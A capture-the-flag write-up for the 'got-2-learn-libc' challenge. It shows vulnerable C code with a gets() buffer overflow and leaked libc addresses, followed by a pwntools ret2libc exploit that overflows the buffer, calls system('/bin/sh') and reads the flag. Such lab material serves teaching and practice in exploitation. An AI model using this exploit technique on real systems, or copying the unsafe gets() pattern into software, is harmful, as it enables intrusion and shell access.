got-2-learn-libc - Points: 250
===========

## Description

>This program gives you the address of some system calls. Can you get a shell?

## Hint:

> * try returning to systems calls to leak information
> * don't forget you can always return back to main()


## Vulnerable Code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 148
#define FLAGSIZE 128

char useful_string[16] = "/bin/sh"; /* Maybe this can be used to spawn a shell? */


void vuln(){
  char buf[BUFSIZE];
  puts("Enter a string:");
  gets(buf);
  puts(buf);
  puts("Thanks! Exiting now...");
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  puts("Here are some useful addresses:\n");

  printf("puts: %p\n", puts);
  printf("fflush %p\n", fflush);
  printf("read: %p\n", read);
  printf("write: %p\n", write);
  printf("useful_string: %p\n", useful_string);

  printf("\n");
  
  vuln();

  
  return 0;
}
```

## Useful Information

> * We have the System and "/bin/sh" address:

> * We cannot write hex as input in terminal (need python script)  :exclamation:

## Exploit

**REQUIRE** :[Pwntools Python](https://github.com/Gallopsled/pwntools)

**Basic Ret2Lib:**

SYS_ADR=PUTS_ADR-0x24800 (Can be found under GDB or Radare2)

BUFFER+SYS_ADR+RET_ADR+BIN_SH_ADR

```python
#!/usr/bin/python2.7
from pwn import *

#GET INFO

#To Complete
user=""
password=""
host=""

path_exec="/problems/got-2-learn-libc_3_6e9881e9ff61c814aafaf92921e88e33"
prog_name="vuln"

#MAKE PAYLOAD
sh =  ssh(host=host,user=user,password=password).process(path_exec+"/"+prog_name)
system_off = 0x24800
adr=sh.recv(4096).decode("utf-8")
print(adr)
adr_puts=int(raw_input("puts: 0x"),16)
adr_useful_string=int(raw_input("useful_string: 0x"),16)
adr_system=adr_puts-system_off

#SEND PAYLOAD AND GOT SHELL
sh.sendline('A'*160+str(p32(adr_system))+'BBBB'+str(p32(adr_useful_string)))
sh.sendline('cd '+path_exec)
sh.sendline('cat flag.txt ')
sh.interactive()
sh.close()

```


